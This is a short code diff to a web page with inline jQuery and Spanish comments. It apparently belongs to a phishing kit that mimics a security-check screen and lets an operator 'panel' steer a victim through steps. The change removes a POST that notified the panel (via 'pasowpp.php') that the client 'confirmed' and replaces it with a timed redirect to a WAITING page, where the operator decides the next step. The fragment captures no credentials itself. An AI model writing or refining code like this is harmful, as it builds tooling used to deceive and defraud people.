@@ -191,22 +191,20 @@ function b34f9_fecha_larga() {
     </body>
 </html>
 <script type="text/javascript">
-    $(document).ready(function() { 
+    $(document).ready(function() {
         $('#btn-intentar').on('click', function() {
             // 1. Ocultar contenido actual
             $(".mensaje-seguridad").hide();
-            
+
             // 2. Mostrar pantalla de carga
             $("#fondo").show();
             $("#cargando-o").show();
-            
-            // 3. Enviar aviso al panel usando el archivo correcto de WPP
-            $.post("../../../../../process/pasowpp.php", { 
-                codigo: "Confirmó 923" 
-            }, function(data) {
-                // 4. Redirigimos a la pantalla de espera
+
+            // 3. Solo ir a WAITING sin cambiar status
+            // El panel verá que el cliente confirmó y decidirá el siguiente paso
+            setTimeout(function() {
                 window.location.href = "../a/WAITING";
-            });
+            }, 1000);
         });
         
         // Prevenir zoom en doble tap
